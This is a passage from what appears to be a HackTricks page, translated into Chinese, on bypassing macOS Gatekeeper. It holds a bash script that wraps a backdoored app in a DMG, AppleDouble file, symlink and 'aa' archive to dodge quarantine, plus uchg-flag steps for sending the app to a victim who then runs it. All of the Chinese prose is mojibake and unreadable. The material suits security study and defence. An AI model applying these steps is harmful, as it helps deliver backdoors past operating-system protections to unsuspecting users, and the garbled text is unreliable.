<pre><code class="language-bash"># Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
</code></pre>
<h3 id="uchg-æ¥è‡ªè¿™ä¸ª-æ¼”è®²"><a class="header" href="#uchg-æ¥è‡ªè¿™ä¸ª-æ¼”è®²">uchg (æ¥è‡ªè¿™ä¸ª <a href="https://codeblue.jp/2023/result/pdf/cb23-bypassing-macos-security-and-privacy-mechanisms-from-gatekeeper-to-system-integrity-protection-by-koh-nakagawa.pdf">æ¼”è®²</a>)</a></h3>
<ul>
<li>åˆ›å»ºä¸€ä¸ªåŒ…å«åº”ç”¨ç¨‹åºçš„ç›®å½•ã€‚</li>
<li>å°† uchg æ·»åŠ åˆ°åº”ç”¨ç¨‹åºä¸­ã€‚</li>
<li>å°†åº”ç”¨ç¨‹åºå‹ç¼©ä¸º tar.gz æ–‡ä»¶ã€‚</li>
<li>å°† tar.gz æ–‡ä»¶å‘é€ç»™å—å®³è€…ã€‚</li>
<li>å—å®³è€…æ‰“å¼€ tar.gz æ–‡ä»¶å¹¶è¿è¡Œåº”ç”¨ç¨‹åºã€‚</li>
<li>Gatekeeper ä¸ä¼šæ£€æŸ¥è¯¥åº”ç”¨ç¨‹åºã€‚</li>
</ul>
<h3 id="é˜²æ­¢-quarantine-xattr"><a class="header" href="#é˜²æ­¢-quarantine-xattr">é˜²æ­¢ Quarantine xattr</a></h3>
<p>åœ¨ä¸€ä¸ª ".app" åŒ…ä¸­ï¼Œå¦‚æœæ²¡æœ‰æ·»åŠ  quarantine xattrï¼Œå½“æ‰§è¡Œæ—¶ <strong>Gatekeeper ä¸ä¼šè¢«è§¦å‘</strong>ã€‚</p>
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>telegram ç¾¤ç»„</strong></a> æˆ– <strong>åœ¨</strong> <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a>** ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**</li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/index.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-launch-environment-constraints.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/index.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-launch-environment-constraints.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
